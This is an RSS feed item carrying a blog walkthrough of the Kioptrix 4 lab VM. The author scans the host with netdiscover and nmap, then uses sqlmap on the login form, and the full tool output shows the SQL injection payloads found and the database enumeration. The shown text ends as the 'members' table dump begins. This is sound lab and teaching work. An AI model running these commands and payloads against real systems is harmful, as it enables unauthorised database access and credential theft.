<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Kioptrix on Matt Andreko</title>
    <link>https://www.mattandreko.com/categories/kioptrix/index.xml</link>
    <description>Recent content in Kioptrix on Matt Andreko</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-US</language>
    <atom:link href="https://www.mattandreko.com/categories/kioptrix/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Kioptrix 4</title>
      <link>https://www.mattandreko.com/2012/02/12/kioptrix-4/</link>
      <pubDate>Sun, 12 Feb 2012 22:27:00 -0500</pubDate>
      
      <guid>https://www.mattandreko.com/2012/02/12/kioptrix-4/</guid>
      <description>&lt;p&gt;I know there are a few different methods to the new &lt;a href=&#34;http://www.kioptrix.com/blog/?p=604&#34;&gt;Kioptrix 4&lt;/a&gt; boot2root.  Unfortunately, I could not find the remote root exploit that is mentioned, but my method used several tools, and privilege escalation.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;Tools used:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://www.backtrack-linux.org&#34;&gt;Backtrack 5 VM&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://nmap.org&#34;&gt;Nmap&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://sqlmap.org&#34;&gt;SqlMap&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;To start out, I had to find the machine on the network.  I booted up my Backtrack VM and Kioptrix VM both using a NAT connection in my VMWare.  This would put them on the same internal network.  In BackTrack, I first found my IP address:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@bt:~# ifconfig
eth1      Link encap:Ethernet  HWaddr 00:0c:29:96:92:1e  
          inet addr:192.168.95.136  Bcast:192.168.95.255  Mask:255.255.255.0
          inet6 addr: fe80::20c:29ff:fe96:921e/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:57480 errors:44807 dropped:0 overruns:0 frame:0
          TX packets:193847 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:14079464 (14.0 MB)  TX bytes:14077265 (14.0 MB)
          Interrupt:19 Base address:0x2024 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:136257 errors:0 dropped:0 overruns:0 frame:0
          TX packets:136257 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:26029235 (26.0 MB)  TX bytes:26029235 (26.0 MB)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Using this information, I scanned the subnet for other devices:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@bt:~# netdiscover -r 192.168.95.0/24

 Currently scanning: Finished!   |   Screen View: Unique Hosts                 
                                                                               
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240               
 _____________________________________________________________________________
   IP            At MAC Address      Count  Len   MAC Vendor                   
 ----------------------------------------------------------------------------- 
 192.168.95.1    00:50:56:c0:00:08    01    060   VMWare, Inc.                 
 192.168.95.2    00:50:56:f1:ea:a0    01    060   VMWare, Inc.                 
 192.168.95.131  00:0c:29:03:da:8f    01    060   VMware, Inc.                 
 192.168.95.254  00:50:56:fb:ac:b6    01    060   VMWare, Inc.  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I figured out of that list, that 1, 2, and 254 were reserved ones, and that 192.168.95.131 would be my Kioptrix VM.  So I did a port scan.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@bt:~# nmap -sV 192.168.95.131

Starting Nmap 5.61TEST4 ( http://nmap.org ) at 2012-02-12 14:03 EST
Nmap scan report for 192.168.95.131
Host is up (0.00011s latency).
Not shown: 566 closed ports, 430 filtered ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
139/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
MAC Address: 00:0C:29:03:DA:8F (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:kernel

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.42 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I started to poke around.  Since HTTP is often times the easiest for me, I started there.  I went to http://&lt;nolink&gt;192.168.95.131 and was presented with a basic login screen (and a cute goat).  I attempted to use the username of &amp;ldquo;admin&amp;rdquo;, with the same password, &amp;ldquo;admin&amp;rdquo;.  It redirected me to a password failure page, located at http://&lt;nolink&gt;192.168.95.131/checklogin.php.  I used the Firefox extension, Tamper Data, to double-check the POST query-string.  It showed, &amp;ldquo;myusername=admin&amp;amp;mypassword=admin&amp;amp;Submit=Login&amp;rdquo;.&lt;/p&gt;

&lt;p&gt;My instincts told me that I should attempt some sql injection on these login screens.  I tinkered with some of the basic ones I remembered off the top of my head, but none of them worked.  It did show promise though, as I received several errors in the process.  This meant it was time for the big guns.&lt;/p&gt;

&lt;p&gt;SqlMap is a tool that I&amp;rsquo;m not super familiar with, but will definitely be learning more about.  It&amp;rsquo;s very powerful, even in the hand of a beginner.  I used the url that I posted to, and specified a few options, and just watched it go:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@bt:/pentest/database/sqlmap# ./sqlmap.py -u http://192.168.95.131/checklogin.php --data=&amp;quot;myusername=admin&amp;amp;mypassword=admin&amp;amp;Submit=Login&amp;quot; --level=5 --risk=3 --dbs

    sqlmap/1.0-dev (r4739) - automatic SQL injection and database takeover tool
    http://www.sqlmap.org

[!] legal disclaimer: usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Authors assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 20:42:28

[20:42:28] [INFO] using &#39;/pentest/database/sqlmap/output/192.168.95.131/session&#39; as session file
[20:42:28] [INFO] testing connection to the target url
[20:42:28] [INFO] heuristics detected web page charset &#39;ascii&#39;
[20:42:28] [INFO] testing if the url is stable, wait a few seconds
[20:42:29] [INFO] url is stable
[20:42:29] [INFO] testing if POST parameter &#39;myusername&#39; is dynamic
[20:42:29] [WARNING] POST parameter &#39;myusername&#39; appears to be not dynamic
[20:42:29] [WARNING] heuristic test shows that POST parameter &#39;myusername&#39; might not be injectable
[20:42:29] [INFO] testing sql injection on POST parameter &#39;myusername&#39;
[20:42:29] [INFO] testing &#39;AND boolean-based blind - WHERE or HAVING clause&#39;
[20:42:30] [INFO] testing &#39;AND boolean-based blind - WHERE or HAVING clause (MySQL comment)&#39;
[20:42:30] [INFO] testing &#39;AND boolean-based blind - WHERE or HAVING clause (Generic comment)&#39;
[20:42:31] [INFO] testing &#39;OR boolean-based blind - WHERE or HAVING clause&#39;
[20:42:31] [INFO] testing &#39;OR boolean-based blind - WHERE or HAVING clause (MySQL comment)&#39;
[20:42:32] [INFO] testing &#39;OR boolean-based blind - WHERE or HAVING clause (Generic comment)&#39;
[20:42:32] [INFO] testing &#39;MySQL boolean-based blind - WHERE or HAVING clause (RLIKE)&#39;
[20:42:32] [INFO] testing &#39;Generic boolean-based blind - Parameter replace (original value)&#39;
[20:42:32] [INFO] testing &#39;MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)&#39;
[20:42:32] [INFO] testing &#39;MySQL boolean-based blind - Parameter replace (ELT - original value)&#39;
[20:42:32] [INFO] testing &#39;MySQL boolean-based blind - Parameter replace (bool*int - original value)&#39;
[20:42:32] [INFO] testing &#39;MySQL &amp;gt;= 5.0 boolean-based blind - Parameter replace (original value)&#39;
[20:42:32] [INFO] testing &#39;MySQL &amp;lt; 5.0 boolean-based blind - Parameter replace (original value)&#39;
[20:42:32] [INFO] testing &#39;PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)&#39;
[20:42:32] [INFO] testing &#39;Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)&#39;
[20:42:32] [INFO] testing &#39;Oracle boolean-based blind - Parameter replace (original value)&#39;
[20:42:33] [INFO] testing &#39;Microsoft Access boolean-based blind - Parameter replace (original value)&#39;
[20:42:33] [INFO] testing &#39;SAP MaxDB boolean-based blind - Parameter replace (original value)&#39;
[20:42:33] [INFO] testing &#39;Generic boolean-based blind - GROUP BY and ORDER BY clauses&#39;
[20:42:33] [INFO] testing &#39;Generic boolean-based blind - GROUP BY and ORDER BY clauses (original value)&#39;
[20:42:33] [INFO] testing &#39;MySQL &amp;gt;= 5.0 boolean-based blind - GROUP BY and ORDER BY clauses&#39;
[20:42:33] [INFO] testing &#39;MySQL &amp;lt; 5.0 boolean-based blind - GROUP BY and ORDER BY clauses&#39;
[20:42:33] [INFO] testing &#39;Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause&#39;
[20:42:33] [INFO] testing &#39;Oracle boolean-based blind - GROUP BY and ORDER BY clauses&#39;
[20:42:33] [INFO] testing &#39;Microsoft Access boolean-based blind - GROUP BY and ORDER BY clauses&#39;
[20:42:33] [INFO] testing &#39;MySQL stacked conditional-error blind queries&#39;
[20:42:33] [INFO] testing &#39;PostgreSQL stacked conditional-error blind queries&#39;
[20:42:33] [INFO] testing &#39;Microsoft SQL Server/Sybase stacked conditional-error blind queries&#39;
[20:42:34] [INFO] testing &#39;MySQL &amp;gt;= 5.0 AND error-based - WHERE or HAVING clause&#39;
[20:42:34] [INFO] testing &#39;MySQL &amp;gt;= 5.1 AND error-based - WHERE or HAVING clause (EXTRACTVALUE)&#39;
[20:42:34] [INFO] testing &#39;MySQL &amp;gt;= 5.1 AND error-based - WHERE or HAVING clause (UPDATEXML)&#39;
[20:42:34] [INFO] testing &#39;MySQL &amp;gt;= 4.1 AND error-based - WHERE or HAVING clause&#39;
[20:42:35] [INFO] testing &#39;PostgreSQL AND error-based - WHERE or HAVING clause&#39;
[20:42:35] [INFO] testing &#39;Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause&#39;
[20:42:35] [INFO] testing &#39;Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)&#39;
[20:42:35] [INFO] testing &#39;Oracle AND error-based - WHERE or HAVING clause (XMLType)&#39;
[20:42:35] [INFO] testing &#39;Oracle AND error-based - WHERE or HAVING clause (utl_inaddr.get_host_address)&#39;
[20:42:35] [INFO] testing &#39;Oracle AND error-based - WHERE or HAVING clause (ctxsys.drithsx.sn)&#39;
[20:42:35] [INFO] testing &#39;Firebird AND error-based - WHERE or HAVING clause&#39;
[20:42:36] [INFO] testing &#39;MySQL &amp;gt;= 5.0 OR error-based - WHERE or HAVING clause&#39;
[20:42:36] [INFO] testing &#39;MySQL &amp;gt;= 5.1 OR error-based - WHERE or HAVING clause (EXTRACTVALUE)&#39;
[20:42:36] [INFO] testing &#39;MySQL &amp;gt;= 5.1 OR error-based - WHERE or HAVING clause (UPDATEXML)&#39;
[20:42:36] [INFO] testing &#39;MySQL &amp;gt;= 4.1 OR error-based - WHERE or HAVING clause&#39;
[20:42:36] [INFO] testing &#39;MySQL OR error-based - WHERE or HAVING clause&#39;
[20:42:36] [INFO] testing &#39;PostgreSQL OR error-based - WHERE or HAVING clause&#39;
[20:42:37] [INFO] testing &#39;Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause&#39;
[20:42:37] [INFO] testing &#39;Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (IN)&#39;
[20:42:37] [INFO] testing &#39;Oracle OR error-based - WHERE or HAVING clause (XMLType)&#39;
[20:42:37] [INFO] testing &#39;Oracle OR error-based - WHERE or HAVING clause (utl_inaddr.get_host_address)&#39;
[20:42:38] [INFO] testing &#39;Oracle OR error-based - WHERE or HAVING clause (ctxsys.drithsx.sn)&#39;
[20:42:38] [INFO] testing &#39;Firebird OR error-based - WHERE or HAVING clause&#39;
[20:42:38] [INFO] testing &#39;MySQL &amp;gt;= 5.0 error-based - Parameter replace&#39;
[20:42:38] [INFO] testing &#39;MySQL &amp;gt;= 5.1 error-based - Parameter replace (EXTRACTVALUE)&#39;
[20:42:38] [INFO] testing &#39;MySQL &amp;gt;= 5.1 error-based - Parameter replace (UPDATEXML)&#39;
[20:42:38] [INFO] testing &#39;PostgreSQL error-based - Parameter replace&#39;
[20:42:38] [INFO] testing &#39;Microsoft SQL Server/Sybase error-based - Parameter replace&#39;
[20:42:38] [INFO] testing &#39;Oracle error-based - Parameter replace&#39;
[20:42:38] [INFO] testing &#39;Firebird error-based - Parameter replace&#39;
[20:42:38] [INFO] testing &#39;MySQL &amp;gt;= 5.0 error-based - GROUP BY and ORDER BY clauses&#39;
[20:42:38] [INFO] testing &#39;MySQL &amp;gt;= 5.1 error-based - GROUP BY and ORDER BY clauses (EXTRACTVALUE)&#39;
[20:42:38] [INFO] testing &#39;MySQL &amp;gt;= 5.1 error-based - GROUP BY and ORDER BY clauses (UPDATEXML)&#39;
[20:42:38] [INFO] testing &#39;PostgreSQL error-based - GROUP BY and ORDER BY clauses&#39;
[20:42:38] [INFO] testing &#39;Microsoft SQL Server/Sybase error-based - ORDER BY clause&#39;
[20:42:38] [INFO] testing &#39;Oracle error-based - GROUP BY and ORDER BY clauses&#39;
[20:42:38] [INFO] testing &#39;MySQL &amp;gt; 5.0.11 stacked queries&#39;
[20:42:38] [INFO] testing &#39;MySQL &amp;lt; 5.0.12 stacked queries (heavy query)&#39;
[20:42:38] [INFO] testing &#39;PostgreSQL &amp;gt; 8.1 stacked queries&#39;
[20:42:39] [INFO] testing &#39;PostgreSQL stacked queries (heavy query)&#39;
[20:42:39] [INFO] testing &#39;PostgreSQL &amp;lt; 8.2 stacked queries (Glibc)&#39;
[20:42:39] [INFO] testing &#39;Microsoft SQL Server/Sybase stacked queries&#39;
[20:42:39] [INFO] testing &#39;Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE)&#39;
[20:42:39] [INFO] testing &#39;Oracle stacked queries (heavy query)&#39;
[20:42:39] [INFO] testing &#39;Oracle stacked queries (DBMS_LOCK.SLEEP)&#39;
[20:42:39] [INFO] testing &#39;Oracle stacked queries (USER_LOCK.SLEEP)&#39;
[20:42:40] [INFO] testing &#39;SQLite &amp;gt; 2.0 stacked queries (heavy query)&#39;
[20:42:40] [INFO] testing &#39;Firebird stacked queries (heavy query)&#39;
[20:42:40] [INFO] testing &#39;MySQL &amp;gt; 5.0.11 AND time-based blind&#39;
[20:42:40] [INFO] testing &#39;MySQL &amp;gt; 5.0.11 AND time-based blind (comment)&#39;
[20:42:40] [INFO] testing &#39;MySQL &amp;lt; 5.0.12 AND time-based blind (heavy query)&#39;
[20:42:40] [INFO] testing &#39;MySQL &amp;lt; 5.0.12 AND time-based blind (heavy query - comment)&#39;
[20:42:40] [INFO] testing &#39;PostgreSQL &amp;gt; 8.1 AND time-based blind&#39;
[20:42:41] [INFO] testing &#39;PostgreSQL &amp;gt; 8.1 AND time-based blind (comment)&#39;
[20:42:41] [INFO] testing &#39;PostgreSQL AND time-based blind (heavy query)&#39;
[20:42:41] [INFO] testing &#39;PostgreSQL AND time-based blind (heavy query - comment)&#39;
[20:42:41] [INFO] testing &#39;Microsoft SQL Server/Sybase time-based blind&#39;
[20:42:41] [INFO] POST parameter &#39;myusername&#39; is &#39;Microsoft SQL Server/Sybase time-based blind&#39; injectable 
[20:42:41] [INFO] testing &#39;MySQL UNION query (NULL) - 1 to 10 columns&#39;
[20:42:41] [INFO] testing &#39;MySQL UNION query (random number) - 1 to 10 columns&#39;
[20:42:41] [INFO] testing &#39;MySQL UNION query (NULL) - 11 to 20 columns&#39;
[20:42:41] [INFO] testing &#39;MySQL UNION query (random number) - 11 to 20 columns&#39;
[20:42:41] [INFO] testing &#39;MySQL UNION query (NULL) - 21 to 30 columns&#39;
[20:42:41] [INFO] testing &#39;MySQL UNION query (random number) - 21 to 30 columns&#39;
[20:42:41] [INFO] testing &#39;MySQL UNION query (NULL) - 31 to 40 columns&#39;
[20:42:41] [INFO] testing &#39;MySQL UNION query (random number) - 31 to 40 columns&#39;
[20:42:41] [INFO] testing &#39;MySQL UNION query (NULL) - 41 to 50 columns&#39;
[20:42:41] [INFO] testing &#39;MySQL UNION query (random number) - 41 to 50 columns&#39;
[20:42:42] [INFO] testing &#39;Generic UNION query (NULL) - 1 to 10 columns&#39;
[20:42:42] [INFO] testing &#39;Generic UNION query (random number) - 1 to 10 columns&#39;
[20:42:42] [INFO] testing &#39;Generic UNION query (NULL) - 11 to 20 columns&#39;
[20:42:42] [INFO] testing &#39;Generic UNION query (random number) - 11 to 20 columns&#39;
[20:42:42] [INFO] testing &#39;Generic UNION query (NULL) - 21 to 30 columns&#39;
[20:42:42] [INFO] testing &#39;Generic UNION query (random number) - 21 to 30 columns&#39;
[20:42:42] [INFO] testing &#39;Generic UNION query (NULL) - 31 to 40 columns&#39;
[20:42:42] [INFO] testing &#39;Generic UNION query (random number) - 31 to 40 columns&#39;
[20:42:42] [INFO] testing &#39;Generic UNION query (NULL) - 41 to 50 columns&#39;
[20:42:42] [INFO] testing &#39;Generic UNION query (random number) - 41 to 50 columns&#39;
[20:42:42] [INFO] testing &#39;Generic UNION query (NUL comment) (NULL) - 1 to 10 columns&#39;
[20:42:42] [INFO] testing &#39;Generic UNION query (NUL comment) (random number) - 1 to 10 columns&#39;
[20:42:42] [INFO] testing &#39;Generic UNION query (NUL comment) (NULL) - 11 to 20 columns&#39;
[20:42:42] [INFO] testing &#39;Generic UNION query (NUL comment) (random number) - 11 to 20 columns&#39;
[20:42:42] [INFO] testing &#39;Generic UNION query (NUL comment) (NULL) - 21 to 30 columns&#39;
[20:42:42] [INFO] testing &#39;Generic UNION query (NUL comment) (random number) - 21 to 30 columns&#39;
[20:42:42] [INFO] testing &#39;Generic UNION query (NUL comment) (NULL) - 31 to 40 columns&#39;
[20:42:42] [INFO] testing &#39;Generic UNION query (NUL comment) (random number) - 31 to 40 columns&#39;
[20:42:42] [INFO] testing &#39;Generic UNION query (NUL comment) (NULL) - 41 to 50 columns&#39;
[20:42:42] [INFO] testing &#39;Generic UNION query (NUL comment) (random number) - 41 to 50 columns&#39;
[20:42:43] [INFO] checking if the injection point on POST parameter &#39;myusername&#39; is a false positive
[20:42:43] [WARNING] false positive injection point detected
[20:42:43] [WARNING] POST parameter &#39;myusername&#39; is not injectable
[20:42:43] [INFO] testing if POST parameter &#39;mypassword&#39; is dynamic
[20:42:43] [WARNING] POST parameter &#39;mypassword&#39; appears to be not dynamic
[20:42:43] [INFO] heuristic test shows that POST parameter &#39;mypassword&#39; might be injectable (possible DBMS: MySQL)
[20:42:43] [INFO] testing sql injection on POST parameter &#39;mypassword&#39;
[20:42:43] [INFO] testing &#39;AND boolean-based blind - WHERE or HAVING clause&#39;
sqlmap got a 302 redirect to &#39;http://192.168.95.131:80/login_success.php&#39;. What do you want to do? 
[1] Follow the redirection (default)
[2] Stay on the original page
[3] Ignore
&amp;gt; 2
[20:42:50] [INFO] testing &#39;AND boolean-based blind - WHERE or HAVING clause (Generic comment)&#39;
[20:42:51] [INFO] testing &#39;OR boolean-based blind - WHERE or HAVING clause&#39;
[20:42:51] [INFO] POST parameter &#39;mypassword&#39; is &#39;OR boolean-based blind - WHERE or HAVING clause&#39; injectable 
[20:42:51] [INFO] testing &#39;MySQL &amp;gt;= 5.0 AND error-based - WHERE or HAVING clause&#39;
[20:42:51] [INFO] testing &#39;MySQL &amp;gt;= 5.1 AND error-based - WHERE or HAVING clause (EXTRACTVALUE)&#39;
[20:42:51] [INFO] testing &#39;MySQL &amp;gt;= 5.1 AND error-based - WHERE or HAVING clause (UPDATEXML)&#39;
[20:42:51] [INFO] testing &#39;MySQL &amp;gt;= 4.1 AND error-based - WHERE or HAVING clause&#39;
[20:42:51] [INFO] testing &#39;MySQL &amp;gt;= 5.0 OR error-based - WHERE or HAVING clause&#39;
[20:42:51] [INFO] testing &#39;MySQL &amp;gt;= 5.1 OR error-based - WHERE or HAVING clause (EXTRACTVALUE)&#39;
[20:42:51] [INFO] testing &#39;MySQL &amp;gt;= 5.1 OR error-based - WHERE or HAVING clause (UPDATEXML)&#39;
[20:42:51] [INFO] testing &#39;MySQL &amp;gt;= 4.1 OR error-based - WHERE or HAVING clause&#39;
[20:42:51] [INFO] testing &#39;MySQL OR error-based - WHERE or HAVING clause&#39;
[20:42:51] [INFO] testing &#39;MySQL &amp;gt;= 5.0 error-based - Parameter replace&#39;
[20:42:51] [INFO] testing &#39;MySQL &amp;gt;= 5.1 error-based - Parameter replace (EXTRACTVALUE)&#39;
[20:42:51] [INFO] testing &#39;MySQL &amp;gt;= 5.1 error-based - Parameter replace (UPDATEXML)&#39;
[20:42:51] [INFO] testing &#39;MySQL &amp;gt; 5.0.11 stacked queries&#39;
[20:42:51] [INFO] testing &#39;MySQL &amp;lt; 5.0.12 stacked queries (heavy query)&#39;
[20:42:51] [INFO] testing &#39;MySQL &amp;gt; 5.0.11 AND time-based blind&#39;
[20:42:51] [INFO] testing &#39;MySQL &amp;gt; 5.0.11 AND time-based blind (comment)&#39;
[20:42:51] [INFO] testing &#39;MySQL &amp;lt; 5.0.12 AND time-based blind (heavy query)&#39;
[20:43:03] [INFO] POST parameter &#39;mypassword&#39; is &#39;MySQL &amp;lt; 5.0.12 AND time-based blind (heavy query)&#39; injectable 
[20:43:03] [INFO] testing &#39;MySQL UNION query (NULL) - 1 to 10 columns&#39;
[20:43:03] [INFO] ORDER BY technique seems to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for UNION query injection technique
[20:43:03] [INFO] target url appears to have 3 columns in query
[20:43:04] [WARNING] if UNION based SQL injection is not detected, please consider usage of option &#39;--union-char&#39; (e.g. --union-char=1) and/or try to force the back-end DBMS (e.g. --dbms=mysql) 
[20:43:04] [INFO] testing &#39;MySQL UNION query (random number) - 1 to 10 columns&#39;
[20:43:04] [INFO] testing &#39;MySQL UNION query (NULL) - 11 to 20 columns&#39;
[20:43:04] [INFO] testing &#39;MySQL UNION query (random number) - 11 to 20 columns&#39;
[20:43:04] [INFO] testing &#39;MySQL UNION query (NULL) - 21 to 30 columns&#39;
[20:43:04] [INFO] testing &#39;MySQL UNION query (random number) - 21 to 30 columns&#39;
[20:43:04] [INFO] testing &#39;MySQL UNION query (NULL) - 31 to 40 columns&#39;
[20:43:04] [INFO] testing &#39;MySQL UNION query (random number) - 31 to 40 columns&#39;
[20:43:04] [INFO] testing &#39;MySQL UNION query (NULL) - 41 to 50 columns&#39;
[20:43:04] [INFO] testing &#39;MySQL UNION query (random number) - 41 to 50 columns&#39;
[20:43:04] [INFO] testing &#39;Generic UNION query (NULL) - 1 to 10 columns&#39;
[20:43:04] [INFO] testing &#39;Generic UNION query (random number) - 1 to 10 columns&#39;
[20:43:04] [INFO] testing &#39;Generic UNION query (NULL) - 11 to 20 columns&#39;
[20:43:04] [INFO] testing &#39;Generic UNION query (random number) - 11 to 20 columns&#39;
[20:43:04] [INFO] testing &#39;Generic UNION query (NULL) - 21 to 30 columns&#39;
[20:43:04] [INFO] testing &#39;Generic UNION query (random number) - 21 to 30 columns&#39;
[20:43:05] [INFO] testing &#39;Generic UNION query (NULL) - 31 to 40 columns&#39;
[20:43:05] [INFO] testing &#39;Generic UNION query (random number) - 31 to 40 columns&#39;
[20:43:05] [INFO] testing &#39;Generic UNION query (NULL) - 41 to 50 columns&#39;
[20:43:05] [INFO] testing &#39;Generic UNION query (random number) - 41 to 50 columns&#39;
[20:43:05] [INFO] testing &#39;Generic UNION query (NUL comment) (NULL) - 1 to 10 columns&#39;
[20:43:05] [INFO] testing &#39;Generic UNION query (NUL comment) (random number) - 1 to 10 columns&#39;
[20:43:05] [INFO] testing &#39;Generic UNION query (NUL comment) (NULL) - 11 to 20 columns&#39;
[20:43:05] [INFO] testing &#39;Generic UNION query (NUL comment) (random number) - 11 to 20 columns&#39;
[20:43:05] [INFO] testing &#39;Generic UNION query (NUL comment) (NULL) - 21 to 30 columns&#39;
[20:43:05] [INFO] testing &#39;Generic UNION query (NUL comment) (random number) - 21 to 30 columns&#39;
[20:43:05] [INFO] testing &#39;Generic UNION query (NUL comment) (NULL) - 31 to 40 columns&#39;
[20:43:05] [INFO] testing &#39;Generic UNION query (NUL comment) (random number) - 31 to 40 columns&#39;
[20:43:05] [INFO] testing &#39;Generic UNION query (NUL comment) (NULL) - 41 to 50 columns&#39;
[20:43:05] [INFO] testing &#39;Generic UNION query (NUL comment) (random number) - 41 to 50 columns&#39;
[20:43:05] [WARNING] in OR boolean-based injections, please consider usage of switch &#39;--drop-set-cookie&#39; if you experience any problems during data retrieval
POST parameter &#39;mypassword&#39; is vulnerable. Do you want to keep testing the others? [Y/n] n
sqlmap identified the following injection points with a total of 3697 HTTP(s) requests:
---
Place: POST
Parameter: mypassword
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: myusername=admin&amp;amp;mypassword=-5618&#39; OR NOT (5039=5039) AND &#39;Gndx&#39;=&#39;Gndx&amp;amp;Submit=Login

    Type: AND/OR time-based blind
    Title: MySQL &amp;lt; 5.0.12 AND time-based blind (heavy query)
    Payload: myusername=admin&amp;amp;mypassword=admin&#39; AND 9312=BENCHMARK(5000000,MD5(0x57485477)) AND &#39;lxSR&#39;=&#39;lxSR&amp;amp;Submit=Login
---

[20:43:11] [INFO] testing MySQL
[20:43:11] [INFO] confirming MySQL
[20:43:11] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
web application technology: PHP 5.2.4, Apache 2.2.8
back-end DBMS: MySQL &amp;gt;= 5.0.0
[20:43:11] [INFO] fetching database names
[20:43:11] [INFO] fetching number of databases
[20:43:11] [WARNING] running in a single-thread mode. Please consider usage of option &#39;--threads&#39; for faster data retrieval
[20:43:11] [INFO] retrieved: 3
[20:43:11] [INFO] retrieved: information_schema
[20:43:12] [INFO] retrieved: members
[20:43:13] [INFO] retrieved: mysql
available databases [3]:
[*] information_schema
[*] members
[*] mysql

[20:43:13] [INFO] Fetched data logged to text files under &#39;/pentest/database/sqlmap/output/192.168.95.131&#39;

[*] shutting down at 20:43:13
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;During this run, you can see that it prompted me only 2 times.  Once because it was redirected, and asked if I wanted to stay on the same page or follow the redirect.  Another because it found that &amp;ldquo;mypassword&amp;rdquo; was injectable, and wanted to know if I wanted to try some others.  I didn&amp;rsquo;t care about any other pages, or any other variables if the first one worked.&lt;/p&gt;

&lt;p&gt;This gave me 3 MySQL databases, &amp;ldquo;information_schema&amp;rdquo;, &amp;ldquo;mysql&amp;rdquo;, and &amp;ldquo;members&amp;rdquo;.  The first two are default in MySQL installations, but the last probably has to do with the Kioptrix VM.  So I decided to go further with the &amp;ldquo;members&amp;rdquo; database.  I opted to dump all the data in the &amp;ldquo;members&amp;rdquo; database.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@bt:/pentest/database/sqlmap# ./sqlmap.py -u http://192.168.95.131/checklogin.php --data=&amp;quot;myusername=admin&amp;amp;mypassword=admin&amp;amp;Submit=Login&amp;quot; --level=5 --risk=3 -D members --dump

    sqlmap/1.0-dev (r4739) - automatic SQL injection and database takeover tool
    http://www.sqlmap.org

[!] legal disclaimer: usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Authors assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 20:48:45

[20:48:46] [INFO] using &#39;/pentest/database/sqlmap/output/192.168.95.131/session&#39; as session file
[20:48:46] [INFO] resuming injection data from session file
[20:48:46] [INFO] resuming back-end DBMS &#39;mysql 5&#39; from session file
[20:48:46] [INFO] testing connection to the target url
[20:48:46] [INFO] heuristics detected web page charset &#39;ascii&#39;
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
---
Place: POST
Parameter: mypassword
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: myusername=admin&amp;amp;mypassword=-5618&#39; OR NOT (5039=5039) AND &#39;Gndx&#39;=&#39;Gndx&amp;amp;Submit=Login

    Type: AND/OR time-based blind
    Title: MySQL &amp;lt; 5.0.12 AND time-based blind (heavy query)
    Payload: myusername=admin&amp;amp;mypassword=admin&#39; AND 9312=BENCHMARK(5000000,MD5(0x57485477)) AND &#39;lxSR&#39;=&#39;lxSR&amp;amp;Submit=Login
---

[20:48:46] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
web application technology: PHP 5.2.4, Apache 2.2.8
back-end DBMS: MySQL 5
[20:48:46] [INFO] fetching tables for database: members
[20:48:46] [INFO] fetching number of tables for database &#39;members&#39;
[20:48:46] [WARNING] running in a single-thread mode. Please consider usage of option &#39;--threads&#39; for faster data retrieval
sqlmap got a 302 redirect to &#39;http://192.168.95.131:80/login_success.php&#39;. What do you want to do? 
[1] Follow the redirection (default)
[2] Stay on the original page
[3] Ignore
&amp;gt; 2
1
[20:48:48] [INFO] retrieved: members
[20:48:48] [INFO] fetching columns for table &#39;members&#39; on database &#39;members&#39;
[20:48:48] [INFO] retrieved: 3
[20:48:48] [INFO] retrieved: id
[20:48:49] [INFO] retrieved: username
[20:48:49] [INFO] retrieved: password
[20:48:50] [INFO] fetching entries for table &#39;members&#39; on database &#39;members&#39;
